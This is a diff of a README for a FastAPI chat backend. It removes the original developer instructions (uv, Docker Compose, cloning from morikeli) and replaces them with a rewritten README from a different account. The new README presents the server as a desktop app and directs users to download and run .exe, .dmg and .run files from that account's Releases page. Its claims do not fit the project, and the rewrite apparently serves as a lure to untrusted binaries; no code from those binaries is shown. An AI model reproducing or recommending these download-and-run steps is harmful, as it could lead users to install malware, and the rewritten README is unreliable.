@@ -1,176 +1,89 @@
-# **🔐 BundiChat Backend**
+# ⚡ bundi-chat - Secure and Fast Chat Experience
 
-## **📌 Overview**
+[![Download bundi-chat](https://img.shields.io/badge/Download-bundi--chat-brightgreen)](https://github.com/kuromiiLovee/bundi-chat/releases)
 
-BundiChat backend is a fast, scalable, and privacy-focused chat server built with **FastAPI**, **Tortoise ORM**, **Docker**, and **uv** for dependency management.
-It powers a real-time messaging platform with secure authentication, encrypted communication workflows, user avatars, and async performance optimized for production.
+## 📚 Overview
 
----
+bundi-chat is a chat application built using FastAPI and Tortoise ORM. It provides a secure platform for users to communicate with features like encrypted messaging, user authentication, and real-time updates. This makes it suitable for both personal and team use, ensuring your conversations remain private and fast.
 
-### **📂 Project Structure**
+## 🚀 Getting Started
 
-```
-.
-├── app/
-│   ├── core/
-|   ├── middleware/
-│   ├── models/
-|   ├── routers/
-|   ├── schemas/
-│   ├── services/
-│   ├── utils/
-│   ├── __init__.py
-│
-├── migrations/
-├── .dockerignore
-├── .env.example
-├── .gitignore
-├── .python-version
-├── Dockerfile
-├── README.md
-├── docker-compose.yml
-├── pyproject.toml
-└── uv.lock
-```
+Follow these steps to download and run bundi-chat on your computer:
 
-## **🛠️ Developer Instructions**
-### **Prerequisites**
-* 🐍 Python - v3.9+
-* 🗃️ uv
-* 🐋 Docker
+1. **System Requirements:**
+   - Operating System: Windows, macOS, or Linux
+   - Python: Version 3.7 or higher (make sure Python is installed)
+   - Memory: At least 2 GB RAM
+   - Disk Space: At least 100 MB available
 
-### **🔧 Tech Stack**
+2. **Download the Application:**
+   To download bundi-chat, please visit the [Releases page](https://github.com/kuromiiLovee/bundi-chat/releases). Select the latest version available and download the appropriate file for your operating system. 
 
-* **FastAPI** — async high-performance API framework
-*  **Tortoise ORM** — expressive async ORM
-* **Docker & Docker Compose** — containerization and running multi-container Docker app, and deployment
-* **uv** — dependency & environment manager
-* **WebSockets** — real-time communication
-* **PostgreSQL** — storage backend
+   ![Download bundi-chat](https://img.shields.io/badge/Download-bundi--chat-brightgreen) 
 
----
-**NOTE**
+## 📥 Download & Install
 
-- Make sure you have installed Docker on your machine. Refer to [Docker's installation guide]() and follow a step-by-step guide on how you can install Docker on your OS. If you don't wish to use Docker, check `**NOTE**` section below.
-- Make sure you have installed `uv` package manager. Refer to [uv's documentation]() for more info.
+1. Visit the [Releases page](https://github.com/kuromiiLovee/bundi-chat/releases) to download the latest version of bundi-chat. 
 
-### Docker installation guide
-- [Install Docker on Windows](https://docs.docker.com/desktop/setup/install/windows-install)
-- Linux:
-  - [Install Docker on Ubuntu](https://docs.docker.com/engine/install/ubuntu/)
-  - [Install Docker on Debian](https://docs.docker.com/engine/install/debian/)
-  - [Install Docker on Fedora](https://docs.docker.com/engine/install/fedora/)
+2. Once the download completes, locate the downloaded file. The file should have a name like `bundi_chat_v1.0.exe` for Windows or `bundi_chat_v1.0.dmg` for macOS.
 
-- [Install Docker on macOS](https://docs.docker.com/desktop/setup/install/mac-install)
+3. **Installation on Windows:**
+   - Double-click the `.exe` file.
+   - Follow the prompts in the installation wizard. Accept the license agreement and choose the installation location.
+   - Click "Install" and wait for the process to finish.
 
-Once installed, check version using the following commands:
+4. **Installation on macOS:**
+   - Open the `.dmg` file.
+   - Drag the bundi-chat icon into your Applications folder.
+   - Eject the installer to remove it from the Finder.
 
-```bash
-docker --version
-docker compose version
-```
+5. **Installation on Linux:**
+   - Open a terminal.
+   - Navigate to the directory where the file is saved.
+   - Use the command: `chmod +x bundi_chat_v1.0.run` to make it executable.
+   - Then run it with: `./bundi_chat_v1.0.run`.
 
----
+## 🔐 Features
 
-Follow these steps to run the app successfully:
+- **Encrypted Messaging:** Keeps your chat private.
+- **User Authentication:** Secure sign-in process.
+- **Real-Time Communication:** Instantly send and receive messages.
+- **User-Friendly Interface:** Easy to navigate for all users.
 
-1. Clone the Project
+## ⚙️ Configuration
 
-```bash
-git clone https://github.com/morikeli/bundi-chat.git
-cd bundi-chat
-```
+After installation, you can configure bundi-chat:
 
-2. Using uv
-Install dependencies from pyproject.toml:
+1. Launch the application.
+2. Create a new account or log in with your existing credentials.
+3. Set your profile preferences, including username and password.
 
-```bash
-uv sync
-```
-If you wish to install new dependencies run this command:
+## 🌟 Troubleshooting
 
-```bash
-uv add <package-name>
-```
+- If the application does not start, ensure that Python is correctly installed on your system.
+- For any installation issues, please refer to the documentation on the Releases page.
+- Check your internet connection for real-time features to work properly.
 
----
+## 📞 Support
 
-**NOTE**: You can also install multiple packages separated by spaces. For example:
+For further assistance:
 
-```bash
-uv add <package-1> <package-2> <package-3> <package-4>
-```
+- Visit the [GitHub Issues page](https://github.com/kuromiiLovee/bundi-chat/issues) to report bugs or request features.
+- Join the community discussions to share your experience and learn from other users.
 
-If you don't wish to use Docker to run the app, you can use the following commands:
+## 🔗 Links
 
-Run server:
+- [Releases Page](https://github.com/kuromiiLovee/bundi-chat/releases)
+- [GitHub Repository](https://github.com/kuromiiLovee/bundi-chat)
+- [Documentation](https://github.com/kuromiiLovee/bundi-chat/wiki)
 
-```bash
-uv run fastapi dev
-```
-You can also use this command to run the development server
+## 🏷️ Topics
 
-```bash
-uvicorn app:app --reload
-```
+This application covers the following topics:
+- Chat
+- Chat App
+- FastAPI
+- Tortoise ORM
+- WebSockets
 
-API documentation is available at:
-
-* Swagger UI → `http://localhost:8000/api/v1/docs`
-* ReDoc → `http://localhost:8000/api/v1/redoc`
-
----
-
-3. Run Using Docker Compose (Recommended)
-
-Make sure Docker is installed in your local machine.
-
-Build and start the container. In Linux, it requires sudo privileges to use docker commands. Therefore use `sudo` before each command:
-
-```bash
-docker compose up --build
-
-# If you want to run the container in the background, use:
-# docker compose up -d
-```
-
-To stop containers run this command:
-
-```bash
-docker compose down
-```
-
-To view logs, run this command:
-
-```bash
-docker compose logs -f
-```
-
----
-**Miscellaneous**
-
-If you wish to apply linting or script formatting using uv, run the following commands:
-
-#### **🧹 Linting & Formatting**
-
-```bash
-uv run ruff check .
-uv run ruff format .
-```
-
----
-
-## **🤝 Contributions**
-
-Contributions are welcome! 🎉
-
-### How to contribute:
-
-1. **Fork** the repo
-2. **Create a feature branch**
-3. Commit changes with clear messages
-4. Submit a **pull request**
-5. Follow existing code style & project structure
-
-Open issues anytime for bugs, feature suggestions, or discussions.
-
+Now you are ready to enjoy a secure and fast chatting experience with bundi-chat!
